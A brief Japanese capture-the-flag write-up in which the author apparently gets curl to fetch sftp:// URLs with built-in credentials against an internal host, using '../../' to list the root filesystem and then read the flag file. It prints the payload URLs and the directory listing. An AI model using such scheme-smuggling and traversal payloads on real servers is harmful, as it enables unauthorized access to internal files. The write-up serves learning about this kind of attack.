まず以下を実行し、SFTPをcurlで実行してFLAGの入ったファイルを特定する。

```
sftp://alpaca:hack@secret/../../
```

すると以下の様な結果を得る。

```
drwxr-xr-x    2 root     root         4096 Apr  6 00:00 opt
drwxr-xr-x    1 root     root         4096 May 14 14:30 .
lrwxrwxrwx    1 root     root            7 Mar  2 21:50 bin -> usr/bin
drwxr-xr-x    1 root     root         4096 Apr  6 00:00 usr
drwx------    1 root     root         4096 May 11 16:55 root
drwxr-xr-x    1 root     root         4096 May 14 14:30 ..
drwxr-xr-x    2 root     root         4096 Apr  6 00:00 media
drwxr-xr-x    2 root     root         4096 Apr  6 00:00 mnt
drwxr-xr-x    5 root     root          340 May 14 14:30 dev
lrwxrwxrwx    1 root     root            8 Mar  2 21:50 sbin -> usr/sbin
dr-xr-xr-x  364 root     root            0 May 14 14:30 proc
drwxr-xr-x    1 root     root         4096 May 14 14:30 etc
drwxrwxrwt    1 root     root         4096 May 11 16:55 tmp
drwxr-xr-x    2 root     root         4096 Apr  6 00:00 srv
drwxr-xr-x    2 root     root         4096 Mar  2 21:50 home
drwxr-xr-x    2 root     root         4096 Mar  2 21:50 boot
lrwxrwxrwx    1 root     root            9 Mar  2 21:50 lib64 -> usr/lib64
drwxr-xr-x    1 root     root         4096 Apr  6 00:00 var
dr-xr-xr-x   13 root     root            0 May  3 07:00 sys
drwxr-xr-x    1 root     root         4096 May 15 15:36 run
lrwxrwxrwx    1 root     root            7 Mar  2 21:50 lib -> usr/lib
-rwxr-xr-x    1 root     root            0 May 14 14:30 .dockerenv
-rw-r--r--    1 root     root           73 May 11 16:54 flag-129e7c8c104ae0b42cdfc6a9566ef0f1.txt
```

一番最後のがFLAG入りファイルである。それを見ればよい。

```
sftp://alpaca:hack@secret/../../flag-129e7c8c104ae0b42cdfc6a9566ef0f1.txt
```